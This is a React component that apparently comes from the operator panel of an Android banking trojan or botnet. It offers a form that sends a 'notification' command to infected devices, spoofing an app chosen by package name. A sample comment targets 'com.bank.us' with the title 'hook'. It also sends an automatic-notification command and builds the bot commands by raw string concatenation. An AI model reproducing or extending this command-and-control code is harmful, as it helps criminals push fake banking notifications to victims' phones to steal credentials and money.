import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';

// {"this":"~command~","name":"push","app":"com.bank.us","title":"hook","text":"book"}
class SendPush extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          title: '',
          text: '',
          app: ''
        }
    }
    
    onChangeText = (e) => {
        this.setState({ 
            text: e.target.value
        });
    }
    onChangeTitle = (e) => {
        this.setState({ 
            title: e.target.value
        });
    }
    onChangeApp = (e) => {
        this.setState({ 
            app: e.target.value
        });
    }

    OnClickSendPush = (e) => {
        if(this.state.title.length == 0 || this.state.text.length == 0 || this.state.app.length == 0) {
           // SettingsContext.ShowToastTitle('error', 'Error', 'Please enter text to all input\'s');
           try_eval('$.notify("Error [notification]", "warn");');
            return;
        }else{
            try_eval('$.notify("Added command [notification]", "info");');
        }
        
        SettingsContext.BotSendCommand('{"cmd":"notification","a":"' + this.state.app + '","ti":"' + this.state.title + '","tx":"' + this.state.text + '"}');
        this.setState({ 
            title: '',
            text: '',
            app: ''
        });
    }

    OnClickSendAutoPush = (e) => {
        SettingsContext.BotSendCommand('{"cmd":"notification_a"}');
    }

    render () {
        return (
            <React.Fragment>
             <div class="modal fade" id="modalPushNotification" tabindex="-1" role="dialog" aria-labelledby="modalPushNotification" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modalClose">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>  

                            <h5 class="modalTitle">Send Push Notification</h5>

                            <div class="modal-body">
                                <input class="form-control margintop5px" value={this.state.app} onChange={this.onChangeApp} placeholder="com.android.push.app.name" />
                                <input class="form-control" value={this.state.title} onChange={this.onChangeTitle} placeholder="Title" />
                                <input class="form-control margintop5px" value={this.state.text} onChange={this.onChangeText} placeholder="Text" />
                            </div>
                            <div class = "modalFooter">
                                <button type="button" onClick={this.OnClickSendPush} class="btn btn-outline-primary"  data-dismiss="modal">Send Push Notification</button>
                            </div>
                        </div>
                    </div>
                </div>

            </React.Fragment>
        );
    }
}

export default SendPush;